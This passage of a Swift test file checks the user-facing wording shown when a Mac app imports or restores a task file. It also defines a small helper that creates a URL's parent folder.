    tp.status = .here; tp.lacking = ["Nightly digest"]
    check(WindowWords.tasksValue(tp, imported: true) == "not added: the task file here stays as it is" && WindowWords.taskLines(tp) == ["The task file here stays as it is. It doesn't have: Nightly digest"],
          "rows: a task file here stays; only the tasks it lacks are listed (no per-task reasons, none is added)")
    var rp = SessionsRestore.TaskPlan(); rp.present = true; rp.writes = true; rp.prompts = 1; rp.leftOut = false
    check(WindowWords.tasksValue(rp, imported: false) == "the task file comes back as it was, not paused (they are this Mac's own tasks), with 1 prompt", "rows: a restore puts its own task file back as it was, not paused")
}

print("checks: \(passed) passed, \(failed) failed")
exit(failed == 0 ? 0 : 1)

extension URL {
    /// The URL, after its folder is made.
    func createDirs() -> URL { try? FileManager.default.createDirectory(at: deletingLastPathComponent(), withIntermediateDirectories: true); return self }
}
